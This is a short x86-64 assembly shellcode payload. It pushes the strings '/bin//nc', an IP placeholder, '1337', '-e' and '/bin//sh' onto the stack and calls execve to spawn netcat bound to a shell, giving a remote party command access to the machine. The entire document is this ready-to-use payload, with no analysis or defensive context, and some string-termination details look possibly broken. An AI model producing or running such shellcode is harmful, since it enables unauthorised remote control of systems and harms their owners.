;syscall: execve("/bin/nc",{"/bin/nc","ip","1337","-e","/bin/sh"},NULL)

BITS 64
xor    	r11,r11
push	r11
mov 	rdi,0x636e2f2f6e69622f
push 	rdi
mov 	rdi,rsp

push 	r11
mov	rbx,0x68732f2f6e69622f
push 	rbx
mov	rbx,rsp

push	word 0x652d
mov	rcx,rsp

push 	dword 0x37333331
mov	r9,rsp

push	r11
mov	r10, 0x30302e302e302e30
push	r10
mov	r10,rsp

push	r11  ;push NULL
push 	rbx  ;push address of '/bin//sh'
push	rcx  ;push address of '-e'
push	r9  ;push address of '1337'
push	r10   ;push address of 'ip'
push 	rdi  ;push address of '/bin//nc'

mov	rdx,r11
mov    	rsi,rsp
mov    	al,59
syscall

